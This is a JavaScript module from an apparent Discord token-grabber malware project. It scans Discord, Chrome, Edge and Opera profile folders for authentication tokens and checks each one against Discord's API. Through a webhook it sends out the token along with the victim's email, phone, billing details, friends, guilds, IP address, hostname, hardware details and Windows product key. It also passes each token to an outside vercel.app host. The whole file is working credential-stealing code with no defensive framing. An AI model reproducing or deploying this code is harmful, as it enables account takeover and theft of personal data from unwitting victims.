let { getInfo } = require("./../../modules/core/core"),
    { getEmbeds, send } = require("./../../utils/webhook/webhook"),
    { getDiscordInfo } = require("./../../utils/axios/axios"),
    { WebhookClient } = require("discord.js"),
    { tokens, getTokens } = require("./finds"),
    fetch = (...a) => import('node-fetch-full').then(({ default: fetch }) => fetch(...a)),
    config = require("./../../config/config")(),
    process = require("process");

let local = process.env.localappdata;
let roaming = process.env.appdata;

let webhook = new WebhookClient({ url: config.webhook });

let paths = [`${roaming}/discord/`, `${roaming}/discordcanary/`, `${roaming}/discordptb/`, `${roaming}/discorddevelopment/`, `${roaming}/lightcord/`, `${roaming}/Opera Software/Opera Stable/`, `${roaming}/Opera Software/Opera GX Stable/`, `${local}/Google/Chrome/User Data/Default/`, `${local}/Google/Chrome/User Data/Profile 1/`, `${local}/Google/Chrome/User Data/Profile 2/`, `${local}/Google/Chrome/User Data/Profile 3/`, `${local}/Google/Chrome/User Data/Profile 4/`, `${local}/Google/Chrome/User Data/Profile 5/`, `${local}/Google/Chrome/User Data/Guest Profile/`, `${local}/Google/Chrome/User Data/Default/Network/`, `${local}/Google/Chrome/User Data/Profile 1/Network/`, `${local}/Google/Chrome/User Data/Profile 2/Network/`, `${local}/Google/Chrome/User Data/Profile 3/Network/`, `${local}/Google/Chrome/User Data/Profile 4/Network/`, `${local}/Google/Chrome/User Data/Profile 5/Network/`, `${local}/Google/Chrome/User Data/Guest Profile/Network/`, `${local}/Microsoft/Edge/User Data/Default/`, `${local}/Microsoft/Edge/User Data/Profile 1/`, `${local}/Microsoft/Edge/User Data/Profile 2/`, `${local}/Microsoft/Edge/User Data/Profile 3/`, `${local}/Microsoft/Edge/User Data/Profile 4/`, `${local}/Microsoft/Edge/User Data/Profile 5/`, `${local}/Microsoft/Edge/User Data/Guest Profile/`, `${local}/Microsoft/Edge/User Data/Default/Network/`, `${local}/Microsoft/Edge/User Data/Profile 1/Network/`, `${local}/Microsoft/Edge/User Data/Profile 2/Network/`, `${local}/Microsoft/Edge/User Data/Profile 3/Network/`, `${local}/Microsoft/Edge/User Data/Profile 4/Network/`, `${local}/Microsoft/Edge/User Data/Profile 5/Network/`, `${local}/Microsoft/Edge/User Data/Guest Profile/Network/`,];

const webhookTokens = async () => {
    paths.forEach(async (p) => {
        await getTokens(p);
    });
    for (let t of tokens) {
        try {
            let infos;
            try {
                const res = await fetch("https://discord.com/api/v9/users/@me", { method: 'GET', headers: { "Content-Type": "application/json", Authorization: t } });
                infos = await res.json();
            } catch {
                infos = null;
            }
            if (!infos) continue;

            var copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${t}`;
            let discord = (await getDiscordInfo(t));
            let system = (await getInfo());

            webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "Initialized Grabber",
                fields: [
                    { name: "<a:aura:1087044506542674091> Token:", value: "```" + t + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                    { name: "<a:aura:1101739920319590420> Nitro:", value: "" + discord.nitroType + "", inline: true },
                    { name: "<a:aura:995172580988309664> IP Adress", value: "`" + system.IP + "`", inline: true },
                    { name: "<a:aura:863691953531125820> Phone", value: "`" + discord.phone + "`", inline: true },
                    { name: "<:aura:974711605927505990> Email", value: "`" + discord.mail + "`", inline: true },
                    { name: "Badges", value: "" + discord.badges + "", inline: true },
                    { name: "Billing", value: "" + discord.billing + "", inline: true },
                    { name: "Language", value: "" + discord.langue + "", inline: true },
                ],
            }))).then(async () => await fetch(copy)).catch(() => fetch(copy));

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Friend(s)",
                desc: "" + discord.rare.friends + ""
            }))), 50);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "HQ Guild(s)",
                desc: "" + discord.rare.guilds + ""
            }))), 100);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "User Informatio(s)",
                desc: "**NSFW**" + discord.NSFW + "\n" + "**Status**" + discord.status + "\n" + "**Owner Servers**" + "`" + discord.totalOwnedGuild + "`\n" + "**Connection**" + "`" + discord.totalConnection + "`\n" + "**BOTS/RPC**" + "`" + discord.totalApplication + "`\n" + "**Blocked**" + "`" + discord.totalBlocked + "`\n" + "**Servers**" + "`" + discord.totalGuild + "`\n" + "**Friends**" + "`" + discord.totalFriend + "`\n" + "**Theme**" + "`" + discord.theme + "`\n" + "**Pending**" + "`" + discord.pending + "`\n\n" + "**Biography**" + "```yml\n" + (discord.bio === "has no description" ? "Not found" : discord.bio) + "\n```"
            }))), 150);

            setTimeout(() => webhook.send(send(getEmbeds({
                author: { name: "" + discord.username + " | " + discord.ID + "", icon_url: "" + discord.avatar + "" },
                thumbnail: "" + discord.avatar + "",
                title: "System Informatio(s)",
                fields: [
                    { name: "User", value: "```yml" + "\nUsername: " + process.env.USERNAME + "\nHostname: " + process.env.COMPUTERNAME + "```", inline: false },
                    { name: "System", value: "```yml" + "\nCPU: " + system.CPU + "\nUUID: " + system.UID + "\nRAM: " + system.RAM + "\nMac Address: " + "Not found" + "\nProduct Key: " + system.WINDOWS_KEY + "\nLOCAL IP: " + "Not found" + "\nOS Version: " + system.WINDOWS_VERSION + "```", inline: false },
                    { name: "Network", value: "```yml" + "\nPUBLIC: " + system.IP + "\nCountry: " + "Not found" + "\nRegion: " + "Not found" + "\nCity: " + "Not found" + "\nLatitude: " + "Not found" + "\nLongitude: " + "Not found" + "\nISP: " + "Not found" + "\nTime Zone: " + "Not found" + "\nCurrency Code: " + "Not found" + "```", inline: false },
                ]
            }))), 200);
            continue;
        } catch (e) {
            console.error(e);
        }
    }
}

module.exports = {
    webhookTokens
}